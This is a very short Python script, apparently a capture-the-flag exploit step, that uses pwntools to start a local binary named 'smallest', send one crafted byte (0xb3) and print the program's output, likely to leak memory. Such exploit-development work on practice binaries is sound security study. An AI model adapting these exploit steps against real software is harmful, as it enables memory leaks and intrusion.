from pwn import *
p = process("./smallest")
p.send("\xb3")
print(p.recv(9999))
